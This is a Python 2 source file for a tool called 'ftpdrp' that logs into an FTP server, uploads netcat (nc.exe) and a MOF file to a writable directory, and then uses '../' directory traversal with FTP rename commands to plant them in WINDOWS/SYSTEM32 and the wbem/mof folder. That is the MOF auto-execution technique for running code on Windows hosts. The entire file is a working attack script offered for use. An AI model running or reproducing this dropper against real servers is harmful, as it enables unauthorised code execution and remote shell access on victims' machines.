#!/usr/bin/env python2
#  -*- coding: utf-8 -*-
"""
   ftpdrp - Drops payload in a writable location on FTP.
   Copyright (C) 2019 nighter
 """

__author__ = 'nighter@nighter.se'

import sys
import os

from ftplib import FTP

class Ftpdrp:

    def __init__(self, hostname, username, password, timeout=10):

        self.hostname = hostname
        self.username = username
        self.password = password
        self.timeout = timeout
        self.path = ''

        # upload files from tmp folder
        os.chdir('/tmp')

        ftp = FTP(host=hostname, user=username, passwd=password, timeout=timeout)
        if 'logged in.' not in ftp.login():
            print("[-] Login failed: %s" % hostname)
            sys.exit(0)

        self.ftp = ftp

    def ftp_upload(self, filename, cwd=''):

        if len(cwd) > 0:
            self.ftp.cwd(cwd)

        fp = open(filename, 'rb')

        try:
            self.ftp.storbinary('STOR %s' % filename, fp)
        except Exception, FTP.error_perm:
            print("[-] Could not upload file: %s" % filename)
            return False

        if len(cwd) > 0:
            self.ftp.sendcmd('CDUP')

        return True

    def ftp_dropper(self, filename):

        if self.ftp_upload(filename, '') is True:
            print("[+] Uploaded: %s" % filename)
            return True

        directory = []
        self.ftp.dir(directory.append)
        for dir in directory[2:]:
            if dir[:1] == 'd':
                dir_name = dir.split(' ')[-1].strip()
                if self.ftp_upload(filename, dir_name) is True:
                    print("[+] Uploaded: %s into %s" % (filename, dir_name))
                    self.path = '%s' % dir_name
                    return True

        return False

    def ftp_directory_traversal_root(self):

        path = ''
        for c in xrange(1, str(self.ftp.pwd()).count('/')):
            path += '../'

        return path

    def ftp_dump_payload(self, mof_name='payload.mof'):

        if self.ftp_dropper("nc.exe") is False:
            print("[-] Failed to upload payload: nc.exe")

        if self.ftp_dropper("nc.exe") is False:
            print("[-] Failed to upload payload: nc.exe")

        if self.ftp_dropper(mof_name) is False:
            print("[-] Failed to upload payload: %s" % mof_name)

        if len(self.path) > 0:
            self.ftp.cwd(self.path)

        traversal_path = self.ftp_directory_traversal_root()

        sys32_path = '%sWINDOWS/SYSTEM32' % traversal_path
        wbem_path = '%sWINDOWS/SYSTEM32/wbem/mof' % traversal_path

        print("[+] traversal sys32=%s" % sys32_path)
        print("[+] traversal wbem=%s" % wbem_path)

        # Upload netcat
        try:
            self.ftp.sendcmd('RNFR nc.exe')
            self.ftp.sendcmd('RNTO %s/nc.exe' % sys32_path)
        except:
            pass

        # Upload mof
        try:
            self.ftp.sendcmd('RNFR %s' % mof_name)
            self.ftp.sendcmd('RNTO %s/%s' % (wbem_path, mof_name))
        except:
            return False

        return True
